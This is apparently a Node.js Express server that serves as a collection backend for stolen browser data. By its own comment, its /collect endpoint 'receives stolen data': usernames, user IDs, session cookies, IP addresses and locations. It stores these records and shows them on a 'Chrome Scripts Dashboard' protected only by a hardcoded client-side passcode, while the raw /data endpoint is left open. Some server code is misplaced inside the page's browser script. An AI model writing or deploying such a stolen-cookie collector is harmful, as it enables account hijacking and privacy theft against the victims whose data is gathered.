const express = require('express');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]');

app.use(express.json());

// Endpoint that receives stolen data
app.post('/collect', (req, res) => {
    const entry = { ...req.body, receivedAt: new Date().toISOString() };
    const data = JSON.parse(fs.readFileSync(DATA_FILE));
    data.push(entry);
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    res.sendStatus(200);
});

// Passcode-protected dashboard
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Chrome Scripts Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background:#111; color:#0ff; font-family:monospace; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
            .container { background:#1a1a1a; padding:2rem; border-radius:12px; box-shadow:0 0 20px #0ff3; width:90%; max-width:500px; }
            input, button { width:100%; padding:12px; margin:10px 0; border:none; border-radius:6px; font-size:16px; }
            input { background:#333; color:#fff; }
            button { background:#0f0; color:#000; font-weight:bold; cursor:pointer; }
            table { width:100%; border-collapse:collapse; margin-top:20px; display:none; }
            th, td { border:1px solid #444; padding:8px; text-align:left; color:#ddd; }
            th { background:#0ff; color:#000; }
            .error { color:red; display:none; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔐 Enter Passcode</h2>
            <input type="password" id="pass" placeholder="Passcode">
            <button onclick="checkPass()">Login</button>
            <div class="error" id="error">Wrong passcode!</div>
            <div id="dataSection">
                <table id="dataTable">
                    <thead>
                        <tr>
                            <th>Username</th>
                            <th>User ID</th>
                            <th>Cookies</th>
                            <th>IP</th>
                            <th>Location</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody"></tbody>
                </table>
            </div>
        </div>
        <script>
            const PASSCODE = '9799';
            function checkPass() {
                const input = document.getElementById('pass').value;
                if (input === PASSCODE) {
                    document.getElementById('error').style.display = 'none';
                    loadData();
                } else {
                    document.getElementById('error').style.display = 'block';
                    document.getElementById('dataTable').style.display = 'none';
                }
            }
            async function loadData() {
                const res = await fetch('/data');
                const entries = await res.json();
                const tbody = document.getElementById('tableBody');
                tbody.innerHTML = '';
                entries.reverse().forEach(e => {
                    const row = tbody.insertRow();
                    row.insertCell().textContent = e.username || '';
                    row.insertCell().textContent = e.userId || '';
                    row.insertCell().textContent = e.cookies || '';
                    row.insertCell().textContent = e.ipInfo?.ip || '';
                    row.insertCell().textContent = (e.ipInfo?.city || '') + ', ' + (e.ipInfo?.country || '');
                });
                document.getElementById('dataTable').style.display = 'table';
            }
            // Also expose raw data endpoint
            app.get('/data', (req, res) => {
                const data = JSON.parse(fs.readFileSync(DATA_FILE));
                res.json(data);
            });
        </script>
    </body>
    </html>
    `);
});

// Raw data endpoint (called by the page)
app.get('/data', (req, res) => {
    const data = JSON.parse(fs.readFileSync(DATA_FILE));
    res.json(data);
});

app.listen(PORT, () => console.log(`Dashboard running on port ${PORT}`));
